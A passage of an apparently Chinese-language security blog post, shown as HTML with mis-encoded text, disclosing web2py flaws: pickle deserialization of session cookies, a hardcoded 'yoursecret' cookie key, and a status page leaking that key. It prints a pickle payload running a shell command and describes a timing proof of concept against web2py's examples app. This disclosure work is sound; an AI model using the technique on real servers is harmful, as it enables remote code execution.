&lt;p&gt;ç›´æ¥èˆ‰å€‹ Pickle çš„ä¾‹å­å¦‚ä¸‹ï¼Œæˆ‘å€‘è£½é€ äº†ä¸€å€‹æœƒåŸ·è¡Œç³»çµ±æŒ‡ä»¤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo success&lt;/code&gt; çš„ç‰©ä»¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;ï¼Œä¸¦ä¸”åºåˆ—åŒ–æˆå­—ä¸² &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;cposix\nsystem\np1\n(S&apos;echo success&apos;\np2\ntp3\nRp4\n.&quot;&lt;/code&gt;ã€‚ç•¶å—å®³è€…ååºåˆ—åŒ–é€™å€‹å­—ä¸²ï¼Œå³è§¸ç™¼åŸ·è¡Œè©²ç³»çµ±æŒ‡ä»¤ï¼Œå› æ­¤å°å‡º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;success&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cPickle&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;cposix&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(S&apos;echo success&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tp3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Rp4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;é€™å°±æ˜¯ Pickle èª¤ç”¨ååºåˆ—åŒ–æ‰€é€ æˆçš„å‘½ä»¤åŸ·è¡Œé¢¨éšªã€‚æ”»æ“Šè€…å¾ˆå®¹æ˜“å¯ä»¥ç”¢ç”Ÿä¸€å€‹å«æœ‰ä»»æ„å‘½ä»¤åŸ·è¡Œçš„åºåˆ—åŒ–å­—ä¸²ï¼Œé€²è€Œè®“å—å®³è€…åœ¨é€²è¡Œååºåˆ—åŒ–çš„éç¨‹ä¸­è§¸ç™¼åŸ·è¡Œæƒ¡æ„å‘½ä»¤ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ååºåˆ—åŒ–--åºåˆ—åŒ–å­—ä¸²å¯æ§&quot;&gt;ååºåˆ—åŒ– ï¼‹ åºåˆ—åŒ–å­—ä¸²å¯æ§&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç™¼ç¾çš„å•é¡Œä¸»è¦ä¾†è‡ª web2py æœ¬èº«çš„ session cookie ä½¿ç”¨ Pickle è™•ç†åºåˆ—åŒ–éœ€æ±‚ (CVE-2016-3957)ï¼Œè€Œä¸”å› ç‚º session cookie çš„åŠ å¯†å­—ä¸²å›ºå®š (CVE-2016-3953)ï¼Œæ”»æ“Šè€…å¯ä»»æ„å½é€ æƒ¡æ„çš„åºåˆ—åŒ–å­—ä¸²é€ æˆå‰é¢æ‰€ä»‹ç´¹çš„å‘½ä»¤åŸ·è¡Œé¢¨éšªã€‚ç´°ç¯€å¦‚ä¸‹ã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3957&quot;&gt;CVE-2016-3957&lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;

&lt;p&gt;web2py çš„æ‡‰ç”¨ç¨‹å¼å¦‚æœä½¿ç”¨ cookie ä¾†å„²å­˜ session è³‡è¨Šï¼Œé‚£éº¼åœ¨æ¯æ¬¡æ¥åˆ°ä½¿ç”¨è€…è«‹æ±‚æ™‚æœƒå°‡ session cookie ç”¨ä¸€å€‹ secure_loads å‡½å¼å°‡ cookie å…§å®¹è®€å…¥ã€‚ [&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/globals.py#L846&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/globals.py#L846&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_storage_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;cookie&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# check if there is session data in cookies
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;secure_loads å‡½å¼å…§å®¹å¦‚ä¸‹ï¼Œåœ¨ä¸€é€£ä¸²è§£å¯†å¾Œæœƒç”¨ pickle.loads æ–¹æ³•å°‡è§£å¯†å…§å®¹ååºåˆ—åŒ–ï¼Œåœ¨é€™è£¡ç¢ºå®š cookie å…§å®¹æœƒä½¿ç”¨ Pickle è™•ç†ã€‚[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/utils.py#L200&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/utils.py#L200&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# &amp;lt;-- Bingo!!!
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å› æ­¤ï¼Œå¦‚æœçŸ¥é“é€£ç·šä¸­ç”¨ä»¥åŠ å¯† cookie å…§å®¹çš„ encryption_keyï¼Œæ”»æ“Šè€…å°±å¯ä»¥å½é€  session cookieï¼Œé€²è€Œåˆ©ç”¨ pickle.loads é€²è¡Œé ç«¯å‘½ä»¤åŸ·è¡Œã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3953&quot;&gt;CVE-2016-3953&lt;/h4&gt;

&lt;p&gt;å¾ˆå¹¸é‹çš„ï¼Œæˆ‘å€‘ç™¼ç¾ web2py é è¨­é–‹å•Ÿçš„ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼æ˜¯ä½¿ç”¨ session cookieï¼Œä¸¦ä¸”æœ‰ä¸€å€‹å¯«æ­»çš„å¯†é‘°ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;ã€‚[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/applications/examples/models/session.py&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;yoursecret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å› æ­¤ï¼Œweb2py çš„ä½¿ç”¨è€…å¦‚æœæ²’æœ‰æ‰‹å‹•é—œé–‰ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ï¼Œæ”»æ“Šè€…å°±å¯ä»¥ç›´æ¥åœ¨ http://[target]/examples/ é é¢ç™¼å‹•æ”»æ“Šå–å¾—ä¸»æ©Ÿæ“ä½œæ¬Šã€‚&lt;/p&gt;

&lt;h4 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h4&gt;

&lt;p&gt;æˆ‘å€‘å˜—è©¦ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt; ä½œç‚º encryption_key å½é€ ä¸€å€‹åˆæ³•çš„ session cookieï¼Œä¸¦å°‡ä¸€å€‹æœƒåŸ·è¡Œç³»çµ±æŒ‡ä»¤ sleep çš„ç‰©ä»¶å¡å…¥å…¶ä¸­ã€‚å¸¶è‘—æ­¤ session cookie é€£å…¥ web2py å®˜ç¶²ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼(http://www.web2py.com/examples)ï¼Œæƒ…å½¢å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;ç•¶æ’å…¥çš„ç‰©ä»¶æœƒåŸ·è¡ŒæŒ‡ä»¤ sleep 3 æ™‚ï¼Œç¶²ç«™å›æ‡‰æ™‚é–“ç‚º 6.8 ç§’&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC1.png&quot; alt=&quot;POC1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç•¶æ’å…¥çš„ç‰©ä»¶æœƒåŸ·è¡ŒæŒ‡ä»¤ sleep 5 æ™‚ï¼Œç¶²ç«™å›æ‡‰æ™‚é–“ç‚º 10.8 ç§’&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC2.png&quot; alt=&quot;POC2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç¢ºå¯¦æœƒå› ç‚ºå¡å…¥çš„ session cookie å€¼ä¸åŒè€Œæœ‰æ‰€å»¶é²ï¼Œè­‰æ˜ç¶²ç«™çš„ç¢ºåŸ·è¡Œäº†ï¼ˆå…©æ¬¡ï¼‰æˆ‘å€‘å½é€ çš„ç‰©ä»¶å…§å®¹ã€‚&lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;h3 id=&quot;å…¶ä»–æ´©æ¼å°è‡´-rce&quot;&gt;å…¶ä»–æ´©æ¼å°è‡´ RCE&lt;/h3&gt;

&lt;p&gt;æ­¤å¤–ï¼Œåœ¨ web2py ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ç‚ºäº†ç¤ºç¯„æ¡†æ¶çš„ç‰¹æ€§ï¼Œå› æ­¤æ´©æ¼äº†è¨±å¤šç’°å¢ƒè®Šæ•¸ã€‚å…¶ä¸­æœ‰å…©å€‹è®Šæ•¸è¼ƒç‚ºæ•æ„Ÿï¼Œé–“æ¥ä¹Ÿæœƒå°è‡´ç«¯å‘½ä»¤åŸ·è¡Œï¼Œåˆ†åˆ¥å¦‚ä¸‹ã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3954&quot;&gt;CVE-2016-3954&lt;/h4&gt;

&lt;p&gt;åœ¨ http://[target]/examples/simple_examples/status é é¢ä¸­ï¼Œresponse åˆ†é å…§å®¹æ´©æ¼äº† session_cookie_key å€¼ã€‚é€™å€‹å€¼å°±æ˜¯ç”¨ä¾†åŠ å¯†å‰é¢æ‰€ä»‹ç´¹çš„ session cookieï¼Œæ­é… CVE-2016-3957 Pickle çš„å•é¡Œå¯ç›´æ¥é ç«¯å‘½ä»¤åŸ·è¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3954.png&quot; alt=&quot;CVE-2016-3954&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¡è«–ä½¿ç”¨è€…æ˜¯å¦è‡ªè¡Œæ›´æ”¹ session_cookie_keyï¼Œæˆ–æ˜¯è©²å€¼æ˜¯ç³»çµ±éš¨æ©Ÿç”¢ç”Ÿã€‚æ­¤ä»‹é¢ä»ç„¶å¯ä»¥å–å¾—æ©Ÿæ•è³‡è¨Šè—‰ä»¥é€ æˆå±å®³ã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3952&quot;&gt;CVE-2016-3952&lt;/h4&gt;

